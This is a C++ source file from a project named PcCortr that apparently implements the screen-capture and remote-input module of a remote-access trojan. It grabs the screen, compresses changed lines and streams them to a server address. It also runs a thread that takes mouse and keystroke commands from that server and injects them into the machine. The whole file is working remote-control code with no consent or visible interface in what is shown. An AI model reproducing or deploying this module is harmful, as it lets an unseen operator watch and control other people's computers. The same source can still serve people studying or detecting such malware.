// MyFrameTrans.cpp: implementation of the CMyFrameTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyFrameTrans.h"
#include "zlib.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyFrameTrans::CMyFrameTrans()
{
	m_FrameSize.cx = 0;
	m_FrameSize.cy = 0;
	dBitSize = 0;
	pOldData = NULL;
	pTmpData = NULL;
	pCurData = NULL;
	pHeadInfo = new BYTE[65535];
	m_LineBitmapSize = 0;
	dwPaletteSize = 0;
	m_SrcFrameLen = 0;
	m_FrameHeadLen = 0;
	hExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);
	lpbi = (LPBITMAPINFOHEADER) pHeadInfo;
}

CMyFrameTrans::~CMyFrameTrans()
{
	//清理资源
	CloseHandle(hExitEvent);
	if(pOldData != NULL) delete [] pOldData;
	if(pTmpData != NULL) delete [] pTmpData;
	if(pCurData != NULL) delete [] pCurData;
	delete [] pHeadInfo;
}

SIZE CMyFrameTrans::GetFrameSize()
{
	SIZE m_FrameSize;
	HDC hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	m_FrameSize.cx = GetDeviceCaps(hScrDC,HORZRES);
	m_FrameSize.cy = GetDeviceCaps(hScrDC,VERTRES);
	DeleteDC(hScrDC);
	return m_FrameSize;
}

HBITMAP CMyFrameTrans::GetFrameCopy()
{
	HBITMAP hBitmap = NULL , hOldBitmap = NULL;
	HDC hScrDC = CreateDC("DISPLAY", NULL, NULL, NULL);
	HDC hMemDC = CreateCompatibleDC(hScrDC);
	hBitmap = CreateCompatibleBitmap(hScrDC,m_FrameSize.cx,m_FrameSize.cy);
	hOldBitmap = (HBITMAP) SelectObject(hMemDC, hBitmap);
	BitBlt(hMemDC,0,0,m_FrameSize.cx,m_FrameSize.cy,hScrDC,0,0,SRCCOPY);
	hBitmap = (HBITMAP) SelectObject(hMemDC, hOldBitmap);
	DeleteDC(hMemDC);
	DeleteDC(hScrDC);
	return hBitmap;
}

void CMyFrameTrans::InitBitmapInfo()
{
	HDC					hScrDC = NULL;
	HANDLE				hPal = NULL;			//调色板句柄
	HANDLE				hOldPal=NULL;			//就调色板
	HBITMAP				hBitmap = NULL;

	//取屏幕数据
	hBitmap = GetFrameCopy();

	//定位指针
	DWORD m_BitDataLen = 0;
	BYTE  pBitData[4096] = {0};

	// 处理调色板   
	hPal = GetStockObject(DEFAULT_PALETTE);
	if (hPal)
	{
		hScrDC  = GetDC(NULL);
		hOldPal = SelectPalette(hScrDC, (HPALETTE)hPal, FALSE);
		RealizePalette(hScrDC);
	}

	//取一线图象数据
	GetDIBits(hScrDC, hBitmap , 0 , 1 , pBitData ,
		(LPBITMAPINFO) lpbi , DIB_RGB_COLORS);

	//释放图象资源
	DeleteObject(hBitmap);

	//恢复调色板   
	if (hOldPal)
	{
		SelectPalette(hScrDC, (HPALETTE) hOldPal, TRUE);
		RealizePalette(hScrDC);
		ReleaseDC(NULL , hScrDC);
	}
}

//取一桢图象数据
void CMyFrameTrans::GetOneFrame(BYTE* pFrameData,
								BYTE* pOldFrameData,
								BYTE* pTmpFrameData , 
								DWORD &m_FrameLen)
{
	HDC					hScrDC = NULL;
	HANDLE				hPal = NULL;			//调色板句柄
	HANDLE				hOldPal=NULL;			//就调色板
	HBITMAP				hBitmap = NULL;

	//取屏幕数据
	hBitmap = GetFrameCopy();

	//定位指针
	DWORD m_BitDataLen = 0;
	BYTE* pOldData = pOldFrameData;						
	BYTE* pMask = pTmpFrameData;
	BYTE* pBitData = pMask + m_FrameSize.cy;
	memset(pMask, 0, m_FrameSize.cy);

	// 处理调色板   
	hPal = GetStockObject(DEFAULT_PALETTE);
	if (hPal)
	{
		hScrDC  = GetDC(NULL);
		hOldPal = SelectPalette(hScrDC, (HPALETTE)hPal, FALSE);
		RealizePalette(hScrDC);
	}

	//循环获取屏幕数据
	for(LONG i = 0; i < m_FrameSize.cy; i++)
	{
		//取一线图象数据
		GetDIBits(hScrDC, hBitmap , i , 1 , pBitData ,
			(LPBITMAPINFO) lpbi , DIB_RGB_COLORS);

		//检查数据是否改变
		if(memcmp(pBitData , pOldData , m_LineBitmapSize))
		{
			pMask[i] = 1;
			memcpy(pOldData , pBitData , m_LineBitmapSize);
			pBitData += m_LineBitmapSize;
			m_BitDataLen += m_LineBitmapSize;
		}
		pOldData += m_LineBitmapSize;
		
		//释放CPU资源
		if(!(i % 50)) Sleep(1);
	}

	//释放图象资源
	DeleteObject(hBitmap);

	//恢复调色板   
	if (hOldPal)
	{
		SelectPalette(hScrDC, (HPALETTE) hOldPal, TRUE);
		RealizePalette(hScrDC);
		ReleaseDC(NULL , hScrDC);
	}
	
	//求待压缩数据长度
	DWORD m_FrameDataLen = lpbi->biHeight + m_BitDataLen;

	//生成压缩数据
	m_FrameLen = m_SrcFrameLen;
	compress(pFrameData , &m_FrameLen , pTmpFrameData , m_FrameDataLen);
}

//控制线程
BOOL CMyFrameTrans::StartWork(char* m_ServerAddr, int m_ServerPort, 
							  int nSend, int nRecv)
{
	//初始化数据
	if(!InitData()) return FALSE;

	//连接目标服务器,创建发送接收管道
	if(!CMyHttpPipeBase::StartWork(
		m_ServerAddr, m_ServerPort, nSend, nRecv)) 
		return FALSE;
	
	//发送包头数据
	if(!SendData((char*) pHeadInfo, m_FrameHeadLen)) 
		return FALSE;

	//启动鼠标键盘状态监控线程
	_beginthread(MouseThread,0,this);

	//开始循环发送屏幕数据
	DWORD dwBytesRead = 0;
	DWORD dwBytesWritten = 0;
	while(WaitForSingleObject(hExitEvent,0) == WAIT_TIMEOUT)
	{
		//取一帧屏幕数据
		GetOneFrame(pCurData + sizeof(DWORD), pOldData , 
					pTmpData ,*((DWORD*) pCurData));

		if(!SendData((char*) pCurData, 
			*((DWORD*) pCurData) + sizeof(DWORD)))
			break;
	}

	//关闭句柄
	StopWork();
	return TRUE;
}

void CMyFrameTrans::ProcessCmd()
{
	while(1)
	{
		MOUSEINFO m_MouseInfo = {0};
		if(!RecvData((char*) &m_MouseInfo,sizeof(MOUSEINFO)))
			break;
		if(m_MouseInfo.cmd == CMD_FRAME_MOUSE_STATE)
			MoveCursor(&m_MouseInfo);
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_STATE)
			HitKeyState(&m_MouseInfo);
		else if(m_MouseInfo.cmd == CMD_FRAME_KEY_ALL)
		{
					
		}
	}

	//终止程序
	SetEvent(hExitEvent);
}

void CMyFrameTrans::MouseThread(LPVOID lPvoid)
{
	CMyFrameTrans* pThis = (CMyFrameTrans*) lPvoid;
	pThis->ProcessCmd();
}

BOOL CMyFrameTrans::InitData()
{
	m_FrameSize = GetFrameSize();
	dBitSize = ((m_FrameSize.cx * 8 + 31) / 32) * 4 * m_FrameSize.cy;
	if(dBitSize > 3072 * 1024) return FALSE;
	m_LineBitmapSize = ((m_FrameSize.cx * 8 + 31) / 32) * 4;
	dwPaletteSize = (1 << 8) * sizeof(RGBQUAD);
	m_SrcFrameLen = m_LineBitmapSize * m_FrameSize.cy + 10240;
	m_FrameHeadLen =  sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	//设置位图信息头结构
	memset(lpbi, 0, sizeof(BITMAPINFOHEADER));
	lpbi->biSize			= sizeof(BITMAPINFOHEADER);
	lpbi->biWidth			= m_FrameSize.cx;
	lpbi->biHeight			= m_FrameSize.cy;
	lpbi->biPlanes			= 1;
	lpbi->biBitCount		= 8;
	lpbi->biCompression		= BI_RGB;

	if(pOldData != NULL) delete [] pOldData;
	if(pTmpData != NULL) delete [] pTmpData;
	if(pCurData != NULL) delete [] pCurData;

	//开辟缓冲
	pOldData = new BYTE[dBitSize + 10240];
	pTmpData = new BYTE[dBitSize + 10240];
	pCurData = new BYTE[dBitSize + 10240];

	InitBitmapInfo();

	return TRUE;
}

void CMyFrameTrans::MoveCursor(LPMOUSEINFO pInfo)
{
	if(pInfo->state == MOUSEEVENTF_WHEEL)
	{
		if(pInfo->x == 1)
			mouse_event(MOUSEEVENTF_WHEEL,0,0,pInfo->y,0);
		else
			mouse_event(MOUSEEVENTF_WHEEL,0,0,0 - (pInfo->y),0);
	}
	SetCursorPos(pInfo->x,pInfo->y);
	if(pInfo->state != 0)
		mouse_event(pInfo->state,0,0,0,0);
}

void CMyFrameTrans::HitKeyState(LPMOUSEINFO pInfo)
{
	if (pInfo->x)
		keybd_event(VK_SHIFT, 0, 0, 0);
	if (pInfo->y)
		keybd_event(VK_CONTROL, 0, 0, 0);
	if (pInfo->state)
		keybd_event(VK_MENU, 0, 0, 0);
	keybd_event(pInfo->ch, 0, 0, 0);
	keybd_event(pInfo->ch, 0, KEYEVENTF_KEYUP, 0);
	if (pInfo->x)
		keybd_event(VK_SHIFT, 0, KEYEVENTF_KEYUP, 0);
	if (pInfo->y)
		keybd_event(VK_CONTROL, 0, KEYEVENTF_KEYUP, 0);
	if (pInfo->state)
		keybd_event(VK_MENU, 0, KEYEVENTF_KEYUP, 0);
}